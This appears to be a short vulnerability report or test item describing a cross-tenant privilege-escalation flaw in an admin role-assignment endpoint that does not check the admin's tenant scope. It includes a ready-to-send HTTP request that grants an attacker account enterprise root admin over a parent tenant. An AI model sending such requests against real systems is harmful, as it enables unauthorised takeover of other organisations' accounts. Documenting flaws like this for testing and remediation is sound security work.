diagnosis: The role assignment endpoint uses an administrative IAM client package that forwards assignments directly to the internal IAM microservice with a system-level bearer token. The endpoint verifies that the caller is an admin, but does not check whether the admin's scope includes targetTenantId. An admin of a small subsidiary tenant can grant superadmin permissions over the parent enterprise tenant or other unrelated corporate tenants.
exploit_request:
POST /api/tenants/roles/assign HTTP/1.1
Host: admin-console.infra.org:8084
Authorization: Bearer <tenant_sub_admin_jwt>
Content-Type: application/json

{"targetUserId": "usr_attacker_account", "roleId": "role_enterprise_root_admin", "targetTenantId": "tenant_master_holding_co"}
